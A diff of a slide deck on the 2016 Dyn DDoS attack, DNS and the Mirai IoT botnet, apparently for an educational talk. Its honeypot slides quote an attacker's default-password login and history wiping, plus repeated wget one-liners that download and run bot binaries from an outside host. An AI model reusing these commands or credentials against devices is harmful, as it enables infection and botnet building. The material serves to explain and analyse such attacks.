@@ -1,26 +1,37 @@
 #HSLIDE
 
+## About Dyn, Mirai and cats
 * What happened 21.Oct 2016
 * What is DNS and why we should care
 * What is/are IoT
 * How to build a IoT botnet yourself and how to track one
 * Why black- and whitehat hackers love cat pictures?
 
-#HSLIDE?image=media/DNS_no_response.png
+#HSLIDE
+
+![Error](media/DNS_no_response.png)
 
 #VSLIDE
 
-> Early Friday morning, Dyn, a company that provides Domain Name Servers (DNS) for a 
-> lot of heavily trafficked websites and services, came under a massive Distributed 
-> Denial of Service (DDoS) attack. This has disrupted access to many sites for people 
-> across the U.S. Yes, it’s why your Spotify app is offline, why you can’t stream Netflix, 
-> and why Twitter won’t load. 
+Early Friday morning, __Dyn__, a company that provides __Domain Name Servers (DNS)__ for a 
+lot of heavily trafficked websites and services, came under a __massive Distributed 
+Denial of Service (DDoS)__ attack. This has disrupted access to many sites for people 
+across the U.S. Yes, it’s why your __Spotify__ app is offline, why you can’t stream __Netflix__, 
+and why __Twitter__ won’t load. 
+
+#VSLIDE
+
+# Key Findings:
+
+* The Friday October 21, 2016 attack has been analyzed as a complex & sophisticated attack, using maliciously targeted, masked TCP and UDP traffic over port 53.
+* Dyn confirms Mirai botnet as primary source of malicious attack traffic.
+* Attack generated compounding recursive DNS retry traffic, further exacerbating its impact.
 
 #HSLIDE
 
 ## DNS
 
-```
+<pre>
 ;; QUESTION SECTION:
 ;spotify.com.                   IN      A
 
@@ -40,15 +51,22 @@ ns2.spotify.com.        300     IN      A       194.132.168.117
 ns3.spotify.com.        300     IN      A       193.235.32.2
 ns4.spotify.com.        300     IN      A       194.132.162.51
 ns5.spotify.com.        300     IN      A       194.68.28.185
-```
+</pre>
 
 #VSLIDE?image=media/43.png
 
 #VSLIDE?image=media/46.png
 
-#VSLIDE?image=media/dyn-network-map.png
+#VSLIDE
+
+## Dyn service network
+![Dyn network](media/dyn-network-map.png)
 
 #HSLIDE
+
+Mirai ..
+
+#VSLIDE
 
 ##IOT
 
@@ -56,9 +74,21 @@ ns5.spotify.com.        300     IN      A       194.68.28.185
 
 __... what about artificial cardiac pacemaker?__
 
+#VSLIDE
+
+## How businesses see IoT ..
+
+![MS](media/business_iot.png)
+
+#VSLIDE
+
+## How hackers see IoT ..
+
+![IPCAM](media/1458871382569824928.jpg)
+
 #HSLIDE
 
-```
+<pre>
 2016-10-28 05:00:46+0200 admin trying auth password
 2016-10-28 05:00:46+0200 login attempt [admin/qwerty] succeeded
 2016-10-28 05:00:49+0200 admin authenticated with password
@@ -70,11 +100,11 @@ rm -rf ./bash_history; history -c"
 2016-10-28 05:00:50+0200 Command found: history -c
 2016-10-28 05:00:50+0200 Closing TTY Log: log/tty/20161028-050050-abab97cc-0e.log after 0 seconds
 2016-10-28 05:00:50+0200 honeypot terminal protocol connection lost disconnected
-```
+</pre>
 
 #HSLIDE
 
-```
+<pre>
 cd /tmp && wget -q http://catsmeowalot.com/ayylmao && chmod +x ayylmao && ./ayylmao
 cd /tmp && wget -q http://catsmeowalot.com/ayymips && chmod +x ayymips && ./ayymips
 cd /tmp && wget -q http://catsmeowalot.com/jackmysh4 && chmod +x jackmysh4 && ./jackmysh4
@@ -85,7 +115,7 @@ cd /tmp && wget -q http://catsmeowalot.com/jackmypowerpc && chmod +x jackmypower
 cd /tmp && wget -q http://catsmeowalot.com/ayyi586 && chmod +x ayyi586 && ./ayyi586
 cd /tmp && wget -q http://catsmeowalot.com/jackmym86k && chmod +x jackmym86k && ./jackmym86k
 cd /tmp && wget -q http://catsmeowalot.com/jackmysparc && chmod +x jackmysparc && ./jackmysparc
-```
+</pre>
 
 #HSLIDE?image=media/
 
